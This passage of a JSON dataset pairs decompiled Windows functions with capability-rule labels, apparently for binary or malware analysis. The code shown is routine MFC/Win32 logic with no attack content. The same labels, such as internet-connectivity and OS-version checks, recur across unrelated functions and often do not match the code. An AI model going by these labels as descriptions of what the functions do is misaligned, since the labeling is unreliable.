code_r0x00420b7a;\n    case 0x1e:\n        puVar9 = *(unaff_EBP + 0xc);\n        fcn.004235b4(puVar9);\n        goto code_r0x00420b7a;\n    case 0x1f:\n        puVar10 = puVar9 >> 0x10;\n        uVar7 = puVar9 & 0xffff;\n        uVar5 = fcn.004235b4(*(unaff_EBP + 0xc), uVar7, puVar10);\n        goto code_r0x00420ba2;\n    case 0x20:\n        puVar9 = *(unaff_EBP + 0xc);\n        goto code_r0x00420add;\n    case 0x21:\ncode_r0x00420add:\n        fcn.0041eeb7(puVar9);\n        goto code_r0x00420b7a;\n    case 0x22:\n        puVar10 = puVar9 >> 0x10;\n        uVar7 = puVar9 & 0xffff;\n        goto code_r0x00420af9;\n    case 0x23:\n        uVar7 = iVar11;\n        puVar10 = iVar3;\ncode_r0x00420af9:\n        uVar5 = fcn.0041eeb7(*(unaff_EBP + 0xc), uVar7, puVar10);\n        goto code_r0x00420ba2;\n    case 0x24:\n        uVar7 = fcn.0041eeb7(*(unaff_EBP + 0xc), puVar9);\n        goto code_r0x00420b70;\n    case 0x26:\n        puVar10 = *(unaff_EBP + 0xc) >> 0x10;\n        uVar7 = fcn.0041eeb7(puVar9, puVar10);\n        goto code_r0x00420b8a;\n    case 0x27:\n    case 0x28:\n        *(unaff_EBP + 8) = *(unaff_EBP + 0xc);\n        *(unaff_EBP + 0xc) = *(unaff_EBP + 0xc) >> 0x10;\n        if (iVar4 == 0x27) {\n            uVar7 = fcn.0041eeb7(puVar9);\n            uVar5 = *(unaff_EBP + 0xc);\n            puVar10 = puVar9;\n            goto code_r0x00420ba2;\n        }\n        puVar9 = *(unaff_EBP + 0xc);\n        uVar7 = *(unaff_EBP + 8);\ncode_r0x00420b70:\n        (*pcVar1)(uVar7, puVar9);\n        break;\n    case 0x29:\n    case 0x30:\ncode_r0x00420b7a:\n        (*pcVar1)(puVar9);\n        break;\n    case 0x2b:\n    case 0x33:\n        (*pcVar1)(*(unaff_EBP + 0xc), puVar9);\n        goto code_r0x00420bb0;\n    case 0x2d:\n        uVar7 = iVar11;\n        puVar9 = iVar3;\ncode_r0x00420b5a:\n        uVar8 = (*pcVar1)(uVar7, puVar9);\ncode_r0x00420c05:\n        *(unaff_EBP + -0x10) = uVar8;\n        break;\n    case 0x31:\n        uVar7 = *(unaff_EBP + 0xc) >> 0x10;\n        puVar10 = puVar9;\ncode_r0x00420b8a:\n        uVar5 = *(unaff_EBP + 0xc);\n        goto code_r0x00420ba2;\n    case 0x32:\n        uVar7 = iVar11;\n        puVar10 = iVar3;\ncode_r0x00420b9e:\n        uVar5 = *(unaff_EBP + 0xc);\ncode_r0x00420ba2:\n        (*pcVar1)(uVar5, uVar7, puVar10);\n        break;\n    case 0x34:\n        iVar4 = (*pcVar1)(*(unaff_EBP + 0xc), *(unaff_EBP + 0xc) >> 0x10, puVar9 & 0xffff, puVar9 >> 0x10);\n        *(unaff_EBP + -0x10) = iVar4;\n        goto code_r0x00420bd4;\n    case 0x41:\n        iVar4 = (*pcVar1)();\n        *(unaff_EBP + -0x10) = iVar4;\n        if (iVar4 != 0) goto code_r0x00420900;\n    }\ncode_r0x00420c08:\n    if (*(unaff_EBP + 0x14) != NULL) {\n        **(unaff_EBP + 0x14) = *(unaff_EBP + -0x10);\n    }\n    uVar8 = 1;\ncode_r0x00420902:\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar8;\n}\n",
        "token_count": 4375
    },
    "0042119f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042119f(char *lpString1, uint lpString2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint var_61ch;\n    uint var_414h;\n    uint var_20ch;\n    uint var_4h;\n    \n    var_4h = *0x44e0fc;\n    iVar2 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(lpString1, lpString2);\n    if ((iVar2 == 0) &&\n       (iVar2 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0x2a),  pcVar1 = _sym.imp.KERNEL32.dll_lstrlenA,  iVar2 != 0)) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(lpString1);\n        iVar3 = (*pcVar1)(lpString2);\n        if (iVar2 == iVar3) {\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetThreadLocale)();\n            pcVar1 = _sym.imp.KERNEL32.dll_GetStringTypeExA;\n            (*_sym.imp.KERNEL32.dll_GetStringTypeExA)(uVar4, 1, lpString1, 0xffffffff, &var_20ch);\n            (*pcVar1)(uVar4, 4, lpString1, 0xffffffff, &var_414h);\n            (*pcVar1)(uVar4, 1, lpString2, 0xffffffff, &var_61ch);\n            if (*lpString1 != '\\0') {\n                iVar2 = 0;\n                do {\n                    if (((*(&var_414h + iVar2) & 0x80) != 0) && (*(&var_20ch + iVar2) != *(&var_61ch + iVar2))) break;\n                    iVar2 = iVar2 + 2;\n                    lpString1 = fcn.0040bd99(lpString1);\n                } while (*lpString1 != '\\0');\n            }\n        }\n    }\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 467
    },
    "004215a7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.004215a7(void)\n\n{\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040bb7c();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CFile.0;\n    *(unaff_EBP + -4) = 0;\n    if ((extraout_ECX[1] != 0xffffffff) && (extraout_ECX[2] != NULL)) {\n        fcn.00421506();\n    }\n    fcn.00401180();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 194
    },
    "004225d8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.004225d8(int32_t param_1, uint param_2)\n\n{\n    uint arg_8h;\n    int32_t arg_10h;\n    \n    if (param_1 != 0) {\n        arg_10h = param_1;\n        arg_8h = fcn.0042226d(param_1, param_1, param_2);\n        fcn.00422592(arg_8h, param_1, arg_10h);\n    }\n    return;\n}\n",
        "token_count": 112
    },
    "00422761": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00422761(int32_t arg_8h)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint16_t *puVar4;\n    uint32_t uVar5;\n    bool bVar6;\n    \n    bVar6 = *(arg_8h + 2) == -1;\n    iVar2 = fcn.00422716(arg_8h);\n    iVar3 = fcn.00422697(arg_8h);\n    if (iVar3 != 0) {\n        iVar2 = iVar2 + (bVar6 * 2 + 1) * 2;\n        iVar3 = fcn.0040c5b2(iVar2);\n        iVar2 = iVar2 + 2 + iVar3 * 2;\n    }\n    if (bVar6) {\n        uVar1 = *(arg_8h + 0x10);\n    }\n    else {\n        uVar1 = *(arg_8h + 8);\n    }\n    if (uVar1 != 0) {\n        uVar5 = uVar1;\n        do {\n            puVar4 = (iVar2 + 3U & 0xfffffffc) + (-bVar6 & 6) + 0x12;\n            if (*puVar4 == 0xffff) {\n                puVar4 = puVar4 + 2;\n            }\n            else {\n                do {\n                    uVar1 = *puVar4;\n                    puVar4 = puVar4 + 1;\n                } while (uVar1 != 0);\n            }\n            if (*puVar4 == 0xffff) {\n                puVar4 = puVar4 + 2;\n            }\n            else {\n                do {\n                    uVar1 = *puVar4;\n                    puVar4 = puVar4 + 1;\n                } while (uVar1 != 0);\n            }\n            uVar1 = *puVar4;\n            if ((uVar1 != 0) && (!bVar6)) {\n                uVar1 = uVar1 - 2;\n            }\n            uVar5 = uVar5 - 1;\n            iVar2 = puVar4 + uVar1 + 2;\n        } while (uVar5 != 0);\n    }\n    return iVar2 - arg_8h;\n}\n",
        "token_count": 509
    },
    "00422824": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00422824(uint lpMultiByteStr, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    ushort *puVar5;\n    uint32_t arg_ch_00;\n    uint *in_ECX;\n    int32_t iVar6;\n    int16_t iVar7;\n    uint32_t arg_8h;\n    bool bVar8;\n    uint var_54h;\n    uint hMem;\n    uint var_4ch;\n    uint var_48h;\n    uint lpWideCharStr;\n    uint var_4h;\n    \n    var_4h = *0x44e0fc;\n    if (in_ECX[1] != 0) {\n        puVar2 = (*_sym.imp.KERNEL32.dll_GlobalLock)(*in_ECX);\n        bVar8 = *(puVar2 + 2) == -1;\n        iVar3 = fcn.00422697(puVar2);\n        iVar1 = bVar8 * 2 + 1;\n        if (bVar8) {\n            puVar2[3] = puVar2[3] | 0x40;\n        }\n        else {\n            *puVar2 = *puVar2 | 0x40;\n        }\n        iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenA)(lpMultiByteStr);\n        if (iVar4 < 0x20) {\n            iVar4 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(0, 0, lpMultiByteStr, 0xffffffff, &lpWideCharStr, 0x20)\n            ;\n            iVar4 = iVar1 * 2 + iVar4 * 2;\n            puVar5 = fcn.00422716(puVar2);\n            iVar6 = 0;\n            if (iVar3 != 0) {\n                iVar3 = fcn.0040c5b2(puVar5 + iVar1);\n                iVar6 = iVar1 * 2 + 2 + iVar3 * 2;\n            }\n            arg_ch_00 = iVar6 + 3 + puVar5 & 0xfffffffc;\n            arg_8h = puVar5 + iVar4 + 3 & 0xfffffffc;\n            if (bVar8) {\n                iVar7 = *(puVar2 + 4);\n            }\n            else {\n                iVar7 = *(puVar2 + 2);\n            }\n            if ((iVar4 != iVar6) && (iVar7 != 0)) {\n                fcn.0040a2e0(arg_8h, arg_ch_00, puVar2 + (in_ECX[1] - arg_ch_00));\n            }\n            *puVar5 = arg_ch;\n            fcn.0040a2e0(puVar5 + iVar1, &lpWideCharStr, iVar4 + iVar1 * -2);\n            in_ECX[1] = in_ECX[1] + (arg_8h - arg_ch_00);\n            (*_sym.imp.KERNEL32.dll_GlobalUnlock)(*in_ECX);\n            in_ECX[2] = 0;\n        }\n    }\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 711
    },
    "0042295c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042295c(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    char *lpMultiByteStr;\n    uint var_44h;\n    int32_t lpvObject;\n    uint var_24h;\n    uint var_4h;\n    \n    pcVar1 = _sym.imp.GDI32.dll_GetStockObject;\n    uVar4 = 10;\n    var_4h = *0x44e0fc;\n    lpMultiByteStr = \"System\";\n    iVar2 = (*_sym.imp.GDI32.dll_GetStockObject)(0x11);\n    if (iVar2 == 0) {\n        iVar2 = (*pcVar1)(0xd);\n        if (iVar2 == 0) goto code_r0x004229d5;\n    }\n    iVar2 = (*_sym.imp.GDI32.dll_GetObjectA)(iVar2, 0x3c, &lpvObject);\n    if (iVar2 != 0) {\n        lpMultiByteStr = &var_24h;\n        uVar3 = (*_sym.imp.USER32.dll_GetDC)(0);\n        if (lpvObject < 0) {\n            lpvObject = -lpvObject;\n        }\n        uVar4 = (*_sym.imp.GDI32.dll_GetDeviceCaps)(uVar3, 0x5a);\n        uVar4 = (*_sym.imp.KERNEL32.dll_MulDiv)(lpvObject, 0x48, uVar4);\n        (*_sym.imp.USER32.dll_ReleaseDC)(0, uVar3);\n    }\ncode_r0x004229d5:\n    if (arg_8h == 0) {\n        arg_8h = uVar4;\n    }\n    fcn.00422824(lpMultiByteStr, arg_8h);\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 425
    },
    "00422a8d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00422a8d(char *lpString, int32_t arg_ch, int32_t arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    char *pcVar5;\n    uint var_4h;\n    \n    iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(lpString);\n    iVar3 = fcn.004386de(lpString, 0, 0);\n    iVar3 = iVar3 + -1;\n    pcVar5 = lpString + (iVar2 - iVar3);\n    if (arg_ch < iVar2) {\n        if (arg_ch < iVar3) {\n            if (arg_10h == 0) {\n                pcVar5 = 0x43d878;\n            }\n        }\n        else {\n            pcVar4 = lpString + 2;\n            if ((*lpString == '\\\\') && (lpString[1] == '\\\\')) {\n                for (; *pcVar4 != '\\\\'; pcVar4 = fcn.0040bd99(pcVar4)) {\n                }\n            }\n            if (3 < iVar2 - iVar3) {\n                do {\n                    pcVar4 = fcn.0040bd99(pcVar4);\n                } while (*pcVar4 != '\\\\');\n            }\n            iVar2 = pcVar4 - lpString;\n            if (iVar2 + 5 + iVar3 <= arg_ch) {\n                while (iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenA)(pcVar4),  arg_ch < iVar3 + 4 + iVar2) {\n                    do {\n                        pcVar4 = fcn.0040bd99(pcVar4);\n                    } while (*pcVar4 != '\\\\');\n                }\n                lpString[iVar2] = '\\0';\n                pcVar1 = _sym.imp.KERNEL32.dll_lstrcatA;\n                (*_sym.imp.KERNEL32.dll_lstrcatA)(lpString, \"\\\\...\");\n                (*pcVar1)(lpString, pcVar4);\n                return;\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_lstrcpyA)(lpString, pcVar5);\n    }\n    return;\n}\n",
        "token_count": 478
    },
    "004233dc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004233dc(int32_t param_1)\n\n{\n    uint *puVar1;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (param_1 != 0) {\n        var_8h = -(*(param_1 + 0x44) != 0);\n        while (var_8h != 0) {\n            fcn.0041b617(&var_8h, &var_ch, &var_4h);\n            puVar1 = *(param_1 + 0x58) + var_4h;\n            *puVar1 = 0;\n            if (*(param_1 + 0x5c) == 2) {\n                puVar1[1] = 0;\n            }\n            (**(param_1 + 0x18))(var_4h);\n        }\n        fcn.0041b4fa();\n        fcn.00409e34();\n    }\n    return;\n}\n",
        "token_count": 222
    },
    "0042343f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0042343f(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    \n    iVar1 = fcn.0043500e();\n    if ((*(iVar1 + 0x10) != 0) && (iVar2 = *(iVar1 + 0x10) + -1,  *(iVar1 + 0x10) = iVar2,  iVar2 == 0)) {\n        if (arg_8h != 0) {\n            if (((arg_8h != -1) && (iVar2 = fcn.0041d1d1(),  iVar2 != 0)) && (*(iVar2 + 0x38) != NULL)) {\n                (**(iVar2 + 0x38))(0, 0);\n            }\n            fcn.004233dc();\n            fcn.004233dc();\n            fcn.004233dc();\n            fcn.004233dc();\n            fcn.004233dc();\n        }\n        iVar2 = fcn.00434fe8();\n        iVar2 = *(iVar2 + 4);\n        iVar3 = fcn.004375c8();\n        if ((((iVar3 != 0) && (iVar2 != 0)) &&\n            ((*(iVar3 + 0xc) == 0 || (uVar4 = fcn.0040d048(*(iVar3 + 0xc)),  uVar4 < *(iVar2 + 0x94))))) &&\n           (*(iVar2 + 0x94) != 0)) {\n            arg_8h = 0;\n            if (*(iVar3 + 0xc) != 0) {\n                arg_8h = fcn.0040d048(*(iVar3 + 0xc));\n                fcn.00409f48(*(iVar3 + 0xc));\n            }\n            iVar2 = fcn.00409f36(*(iVar2 + 0x94));\n            *(iVar3 + 0xc) = iVar2;\n            if ((iVar2 == 0) && (arg_8h != 0)) {\n                uVar5 = fcn.00409f36(arg_8h);\n                *(iVar3 + 0xc) = uVar5;\n            }\n        }\n    }\n    return *(iVar1 + 0x10) != 0;\n}\n",
        "token_count": 530
    },
    "00423538": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.00423538(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040bb7c();\n    iVar1 = fcn.0043500e();\n    if ((*(iVar1 + 0x18) == 0) && (*(unaff_EBP + 8) != 0)) {\n        uVar2 = fcn.0041baa4(0x426e5d);\n        iVar3 = fcn.0041bab6(0x60);\n        *(unaff_EBP + 8) = iVar3;\n        *(unaff_EBP + -4) = 0;\n        if (iVar3 == 0) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = fcn.00423296(0x44277c, 0x438647, 0x435f2c, 4, 1);\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(iVar1 + 0x18) = uVar4;\n        fcn.0041baa4(uVar2);\n    }\n    uVar2 = *(iVar1 + 0x18);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar2;\n}\n",
        "token_count": 365
    },
    "00423d3a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00423d3a(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *var_4h;\n    \n    var_4h = param_1;\n    var_4h = (**(*param_1 + 0x60))();\n    do {\n        if (var_4h == NULL) {\n            uVar2 = (**(*param_1 + 0x90))();\n            return uVar2;\n        }\n        (**(*param_1 + 100))(&var_4h);\n        iVar1 = fcn.0041f838();\n    } while ((iVar1 == 0) || (*(iVar1 + 0x54) < 1));\n    return 1;\n}\n",
        "token_count": 170
    },
    "00423e70": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00423e70(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = *(param_1 + 0x34);\n    while (iVar1 != 0) {\n        iVar1 = fcn.0041aea9();\n        *(iVar1 + 0x50) = 0;\n        iVar1 = *(param_1 + 0x34);\n    }\n    return;\n}\n",
        "token_count": 97
    },
    "00423eaa": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00423eaa(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    var_4h = param_1;\n    var_4h = (**(*param_1 + 0x60))();\n    while (var_4h != NULL) {\n        iVar1 = (**(*param_1 + 100))(&var_4h);\n        iVar1 = (*_sym.imp.USER32.dll_IsWindowVisible)(*(iVar1 + 0x1c));\n        if ((iVar1 != 0) && (iVar1 = fcn.0041f838(),  iVar1 != 0)) {\n            *(iVar1 + 0x54) = 0xffffffff;\n        }\n    }\n    var_8h = 0;\n    var_4h = (**(*param_1 + 0x60))();\n    while (var_4h != NULL) {\n        iVar1 = (**(*param_1 + 100))(&var_4h);\n        iVar1 = (*_sym.imp.USER32.dll_IsWindowVisible)(*(iVar1 + 0x1c));\n        if (((iVar1 != 0) && (iVar1 = fcn.0041f838(),  iVar1 != 0)) && (*(iVar1 + 0x54) == -1)) {\n            var_8h = var_8h + 1;\n            *(iVar1 + 0x54) = var_8h;\n        }\n    }\n    iVar1 = 1;\n    var_4h = (**(*param_1 + 0x60))();\n    while (var_4h != NULL) {\n        iVar2 = (**(*param_1 + 100))(&var_4h);\n        iVar2 = (*_sym.imp.USER32.dll_IsWindowVisible)(*(iVar2 + 0x1c));\n        if (((iVar2 != 0) && (piVar3 = fcn.0041f838(),  piVar3 != NULL)) && (piVar3[0x15] == iVar1)) {\n            if (var_8h == 1) {\n                piVar3[0x15] = 0;\n            }\n            (**(*piVar3 + 0x15c))(1);\n            iVar1 = iVar1 + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 540
    },
    "00424386": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00424386(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_208h;\n    uint var_108h;\n    uint var_4h;\n    \n    var_4h = *0x44e0fc;\n    iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenA)(arg_8h);\n    if (iVar1 < 0x104) {\n        iVar1 = fcn.0042176f(&var_108h, arg_8h);\n        if (iVar1 != 0) goto code_r0x004243c9;\n    }\n    fcn.00422592(3, 0xffffffff, 0);\ncode_r0x004243c9:\n    fcn.00403860(&var_108h);\n    in_ECX[0x13] = 0;\n    iVar1 = fcn.0042149f(&var_108h, &var_208h, 0x100);\n    if (iVar1 == 0) {\n        (**(*in_ECX + 0x50))(&var_208h);\n    }\n    if (arg_ch != 0) {\n        iVar1 = fcn.00434fe8();\n        (**(**(iVar1 + 4) + 0x8c))(in_ECX[8]);\n    }\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 323
    },
    "00424cdc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00424cdc(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    if ((arg_ch == 0) || (arg_8h == 0)) {\n        iVar1 = 0;\n    }\n    else {\n        if ((*(in_ECX + 0x18) & 1) == 0) {\n            fcn.00425c42(4, *(in_ECX + 0x14));\n        }\n        uVar3 = *(in_ECX + 0x2c) - *(in_ECX + 0x28);\n        if (arg_ch < uVar3) {\n            uVar3 = arg_ch;\n        }\n        fcn.0040b7b0(arg_8h, *(in_ECX + 0x28), uVar3);\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + uVar3;\n        arg_8h = arg_8h + uVar3;\n        uVar3 = arg_ch - uVar3;\n        if (uVar3 != 0) {\n            iVar1 = uVar3 - uVar3 % *(in_ECX + 0x20);\n            var_8h = 0;\n            var_4h = iVar1;\n            do {\n                iVar2 = (**(**(in_ECX + 0x24) + 0x34))(arg_8h, var_4h);\n                arg_8h = arg_8h + iVar2;\n                var_8h = var_8h + iVar2;\n                var_4h = var_4h - iVar2;\n                if (iVar2 == 0) break;\n            } while (var_4h != 0);\n            uVar3 = uVar3 - var_8h;\n            if ((uVar3 != 0) && (var_8h == iVar1)) {\n                uVar4 = 0;\n                if (*(in_ECX + 8) == 0) {\n                    if ((*(in_ECX + 0xc) != 0) || (var_4h = *(in_ECX + 0x20),  *(in_ECX + 0x20) < uVar3)) {\n                        var_4h = uVar3;\n                    }\n                    var_8h = *(in_ECX + 0x30);\n                    do {\n                        iVar1 = (**(**(in_ECX + 0x24) + 0x34))(var_8h, var_4h);\n                        var_8h = var_8h + iVar1;\n                        var_4h = var_4h - iVar1;\n                        uVar4 = uVar4 + iVar1;\n                        if ((iVar1 == 0) || (var_4h == 0)) break;\n                    } while (uVar4 < uVar3);\n                    iVar1 = *(in_ECX + 0x30);\n                    *(in_ECX + 0x2c) = iVar1 + uVar4;\n                }\n                else {\n                    (**(**(in_ECX + 0x24) + 0x50))(0, *(in_ECX + 0x20), in_ECX + 0x30, in_ECX + 0x2c);\n                    iVar1 = *(in_ECX + 0x30);\n                }\n                uVar4 = *(in_ECX + 0x2c) - iVar1;\n                *(in_ECX + 0x28) = iVar1;\n                if (uVar3 < uVar4) {\n                    uVar4 = uVar3;\n                }\n                fcn.0040b7b0(arg_8h, iVar1, uVar4);\n                *(in_ECX + 0x28) = *(in_ECX + 0x28) + uVar4;\n                uVar3 = uVar3 - uVar4;\n            }\n        }\n        iVar1 = arg_ch - uVar3;\n    }\n    return iVar1;\n}\n",
        "token_count": 935
    },
    "00424e80": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00424e80(uint32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    uint32_t arg_8h_00;\n    int32_t iVar3;\n    int32_t in_ECX;\n    uint unaff_EBX;\n    int32_t iVar4;\n    uint unaff_ESI;\n    int32_t iVar6;\n    uint var_8h;\n    uint32_t var_4h;\n    uint32_t uVar5;\n    \n    if ((*(in_ECX + 0x18) & 1) != 0) {\n        uVar5 = *(in_ECX + 0x28);\n        piVar1 = in_ECX + 0x2c;\n        var_4h = *piVar1 - uVar5;\n        uVar2 = arg_8h + var_4h;\n        if (*(in_ECX + 8) == 0) {\n            arg_8h_00 = *(in_ECX + 0x30);\n            if (arg_8h_00 < uVar5) {\n                if (0 < var_4h) {\n                    fcn.0040a2e0(arg_8h_00, uVar5, var_4h);\n                    arg_8h_00 = *(in_ECX + 0x30);\n                    *(in_ECX + 0x28) = arg_8h_00;\n                    *piVar1 = arg_8h_00 + var_4h;\n                }\n                uVar5 = arg_8h;\n                if (*(in_ECX + 0xc) == 0) {\n                    uVar5 = *(in_ECX + 0x20);\n                }\n                iVar4 = uVar5 - var_4h;\n                iVar6 = var_4h + arg_8h_00;\n                do {\n                    iVar3 = (**(**(in_ECX + 0x24) + 0x34))(iVar6, iVar4);\n                    var_4h = var_4h + iVar3;\n                    iVar6 = iVar6 + iVar3;\n                    iVar4 = 